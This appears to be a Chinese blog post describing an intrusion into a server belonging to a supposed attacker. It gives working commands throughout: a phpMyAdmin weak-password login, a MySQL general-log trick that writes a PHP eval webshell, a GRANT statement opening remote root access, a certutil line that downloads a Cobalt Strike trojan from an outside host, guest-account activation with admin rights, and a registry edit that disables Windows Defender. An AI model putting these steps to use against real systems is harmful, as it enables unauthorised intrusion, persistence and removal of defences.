> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/VvaUCfhELu020U3QI5s5Ew)

前言

发现该恶意 IP 上 80 端口存在 phpmyadmin  

通过弱口令成功登陆 phpmyadmin 后台

写 shell

`show variables like '%general%';`

![](https://mmbiz.qpic.cn/mmbiz_png/olwnDibj8yicRUG4gPFlLVVtnavo5LbMHs0efQOhBTPzH9iaG2toI44o1sibgBNQV8fcOOx9nMcpiaPYWyfunaf15vQ/640?wx_fmt=png)

##### 查看数据库目录

`select @@basedir`

![](https://mmbiz.qpic.cn/mmbiz_png/olwnDibj8yicRUG4gPFlLVVtnavo5LbMHs7xNSIaUDH46wQP2bNklFPcHXbJve96Q8icfK1BFvt6GmFxSlRl0snHg/640?wx_fmt=png)

##### 猜测根目录

因为数据库目录为 C:/phpStudy/PHPTutorial/MySQL/，猜测网站根目录为 C:/phpStudy/PHPTutorial/www/

##### 设置日志文件，发现被转义。

![](https://mmbiz.qpic.cn/mmbiz_png/olwnDibj8yicRUG4gPFlLVVtnavo5LbMHs732e5OEBUOKgBtc9wnVeE8YcmrLOxF25hfHoicZK7NuH0icdJX6BbWuQ/640?wx_fmt=png)

设置为双 反斜杠 防止转义

```
set global general_log_file=’C:\phpstudy\PHPTutorial\WWW\1234.php’
```

##### 写 webshell 失败

经过排查，发现网站根目录错误，经过猜测，成功找到网站根路径

##### 重新设置日志文件

```
set global general_log_file=’C:\phpstudy\PHPTutorial\WWW\Test\1234.php’
```

##### 写入成功

```
select '<?php eval($_POST[cmd]);?>'
```

无法连接

通过 php 执行 tasklist，发现目标服务器上存在安全狗进程。

##### 尝试写入免杀一句话，发现无法通过 php 文件进行写入

开启 3306 外联尝试写入一句话

```
GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'root' WITH GRANT OPTION;
```

成功连接

![](https://mmbiz.qpic.cn/mmbiz_png/olwnDibj8yicRUG4gPFlLVVtnavo5LbMHsbnzyn8FrRRek6PhzibUsv7QAuEiaocicy6ZiapuibldYFoaemIFSeB3DVuA/640?wx_fmt=png)

发现目标配置文件未打开导入导出功能，无法写入文件。

通过 php 文件下载免杀 CS 木马

文件代码如下：

```
select "<?php echo `certutil.exe -urlcache -split -f http://xx.xx.xx.xx:8080/xx.exe C:\\phpStudy\\PHPTutorial\\WWW\\test\\xx.exe`;?>"
```

### cs 成功上线目标主机，权限为最高权限。

![](https://mmbiz.qpic.cn/mmbiz_png/olwnDibj8yicRUG4gPFlLVVtnavo5LbMHsayxY5JTyTNapyIKdOmzZlpllqB99TBbQF1vqZwK9DdwB2HcZOL9eYQ/640?wx_fmt=png)

### 查看服务器信息

![](https://mmbiz.qpic.cn/mmbiz_png/olwnDibj8yicRUG4gPFlLVVtnavo5LbMHsWzP9sYV8djsdLDSCeVfL60RDOc7cgdHgVBuuDNTDLySApzyRNA5j0g/640?wx_fmt=png)

查看攻击者主机文件目录  

![](https://mmbiz.qpic.cn/mmbiz_png/olwnDibj8yicRUG4gPFlLVVtnavo5LbMHsCKXDpZ0sG05W9WlWy9YLkP2f2273Zd8NupT7J9tyVvsxlLhXxNPS0A/640?wx_fmt=png)

尝试查看管理员用户密码  

![](https://mmbiz.qpic.cn/mmbiz_png/olwnDibj8yicRUG4gPFlLVVtnavo5LbMHspScYXjfiaiaibictshEicTI4N9LCFgTAeexxMIpPAYMvf9UJUaEwTg57Nkg/640?wx_fmt=png)

由于服务器版本为 2012，直接使用 mimikatz 读取密码失败。

激活 Guest 用户

首先激活 guest 用户

```
net user guest /active:yes
net user guest 1q2w3e4r@
net localgroup administrators guest /add
```

![](https://mmbiz.qpic.cn/mmbiz_png/olwnDibj8yicRUG4gPFlLVVtnavo5LbMHswibCAfYywn5pMN4rwicwPDbMN7X10d4K9ju0xMkGqwKcUbgKGbUEjg2A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/olwnDibj8yicRUG4gPFlLVVtnavo5LbMHs8yLGWOBrCricriakibACvHHouqyUdOHlLZWOa0L5n1Y4k7Pxd9FmGBeuQ/640?wx_fmt=jpeg)

在服务器桌面上查看到了攻击记录  

![](https://mmbiz.qpic.cn/mmbiz_png/olwnDibj8yicRUG4gPFlLVVtnavo5LbMHst4Ol952h62411yjg48iaBa9852gGY3W2vpZaADWhe3p5iam57t9ibClqQ/640?wx_fmt=png)

guest 远程登陆断开，被发现了

### 查看攻击者在线。

![](https://mmbiz.qpic.cn/mmbiz_png/olwnDibj8yicRUG4gPFlLVVtnavo5LbMHswhjqZCVgx95b7WZiayibmiapdpOfwarmfQ5sLrTbfUy7ICQu9QLgq4GFw/640?wx_fmt=png)

查看攻击者连接 ip。

![](https://mmbiz.qpic.cn/mmbiz_png/olwnDibj8yicRUG4gPFlLVVtnavo5LbMHsia28awJAqmGVVR8dCTH6BTicPlr7ic7B8ibEl6gicq8IpeDv8CqmvXZXbFA/640?wx_fmt=png)

### 对连接 ip 进行定位监控

172.27.16.15:3389 xx.xx.xx.xx:11072 ESTABLISHED 1552

使用 cs 关闭杀软

`reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /d 1 /t REG_DWORD`

上传远控后录屏观察攻击者行为